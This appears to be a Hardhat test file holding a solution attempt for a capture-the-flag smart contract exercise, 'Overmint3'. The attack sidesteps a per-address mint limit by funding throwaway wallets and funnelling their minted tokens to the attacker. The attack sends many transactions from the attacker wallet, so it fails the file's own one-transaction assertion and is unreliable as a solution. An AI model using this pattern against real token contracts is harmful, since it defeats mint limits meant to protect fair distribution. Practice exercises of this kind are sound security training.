const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint3";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const provider = attackerWallet.provider;
            const victimContractWithSignature = victimContract.connect(attackerWallet);
            await victimContractWithSignature.mint();
            const randomWallet1 = ethers.Wallet.createRandom().connect(provider);
            const randomWallet2 = ethers.Wallet.createRandom().connect(provider);
            const randomWallet3 = ethers.Wallet.createRandom().connect(provider);
            const randomWallet4 = ethers.Wallet.createRandom().connect(provider);
            const randomWallet5 = ethers.Wallet.createRandom().connect(provider);
            const wallets = [randomWallet1, randomWallet2, randomWallet3, randomWallet4];

            // Assuming attackerWallet has enough Ether to fund the random wallets
            const fundingAmount = ethers.utils.parseEther("0.1"); // Example funding amount

            for (let wallet of wallets) {
                // Transfer Ether to each wallet from attackerWallet
                await attackerWallet.sendTransaction({
                    to: wallet.address,
                    value: fundingAmount,
                });
                await attackerWallet.sendTransaction({
                    to: randomWallet5.address,
                    value: fundingAmount,
                });
            }

            // Now transfer all the tokens to the attacker wallet using the wallets
            for (let i = 0; i < wallets.length; i++) {
                const victimContractWithWallet = victimContract.connect(wallets[i]);
                await victimContractWithWallet.mint();
                //approve so that transferFrom can be called
                await victimContractWithWallet.approve(randomWallet5.address, i + 2);
                //transfer the token to the attacker wallet
                const victimContractWithRandomWallet5 = victimContract.connect(randomWallet5);
                //approve a third guy to transfer your token to the player
                await victimContractWithRandomWallet5.transferFrom(wallets[i].address, attackerWallet.address, i + 2);
            }
        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
                1,
                "must exploit one transaction"
            );
        });
    });
});
